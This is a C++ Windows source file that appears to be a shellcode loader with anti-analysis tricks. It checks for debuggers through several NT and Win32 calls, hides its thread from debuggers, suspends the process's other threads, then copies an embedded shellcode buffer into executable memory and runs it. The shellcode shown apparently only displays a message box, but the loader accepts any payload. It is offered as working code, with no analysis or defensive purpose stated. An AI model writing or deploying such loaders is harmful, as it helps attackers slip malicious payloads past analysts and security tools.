#include <windows.h>
#include <TlHelp32.h>
#include <ntstatus.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

bool isDebuggerPresent() {
    BOOL isDebugger = FALSE;

    // Check for a debugger using NtQueryInformationProcess
    typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );

    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule) {
        pfnNtQueryInformationProcess pNtQueryInformationProcess =
            (pfnNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");

        if (pNtQueryInformationProcess) {
            ULONG DebugPort = 0;
            if (NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), 7, &DebugPort, sizeof(DebugPort), nullptr))) {
                if (DebugPort != 0) {
                    return true;
                }
            }
        }
    }

    // Check for a debugger using IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return true;
    }

    // Check for a debugger using CheckRemoteDebuggerPresent
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugger);
    return isDebugger;
}

void blockDebuggerThreads() {
    DWORD myThreadId = GetCurrentThreadId();
    DWORD currentProcessId = GetCurrentProcessId();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);

        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == currentProcessId && te32.th32ThreadID != myThreadId) {
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread != NULL) {
                        SuspendThread(hThread);
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }

        CloseHandle(hSnapshot);
    }
}

void hideThreadFromDebugger() {
    // Hide the current thread from the debugger
    typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
        HANDLE ThreadHandle,
        ULONG ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength
        );

    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        pfnNtSetInformationThread NtSetInformationThread =
            (pfnNtSetInformationThread)GetProcAddress(hNtDll, "NtSetInformationThread");

        if (NtSetInformationThread) {
            const ULONG ThreadHideFromDebugger = 0x11;
            NtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);
        }
    }
}

int main() {
    hideThreadFromDebugger();

    if (isDebuggerPresent()) {
        ExitProcess(0);
    }

    blockDebuggerThreads();
 // if there's no Debugger, run that ShellCode
    unsigned char buf[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\xef\xce\xe0\x60\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
        "\x52\xe8\x5f\xff\xff\xff\x68\x6e\x67\x58\x20\x68\x75\x67"
        "\x67\x69\x68\x2d\x44\x65\x62\x68\x41\x6e\x74\x69\x31\xdb"
        "\x88\x5c\x24\x0e\x89\xe3\x68\x58\x20\x20\x20\x68\x67\x4c"
        "\x30\x72\x68\x67\x67\x69\x6e\x68\x44\x65\x62\x75\x68\x41"
        "\x6e\x74\x69\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2\x52"
        "\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";


    PVOID pBuffer = VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(pBuffer, buf, sizeof(buf));

    DWORD oldProtect = NULL;
    VirtualProtect(pBuffer, sizeof(buf), PAGE_EXECUTE_READWRITE, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pBuffer), NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    // Clear and close handles
    CloseHandle(hThread);

    return 0;
}
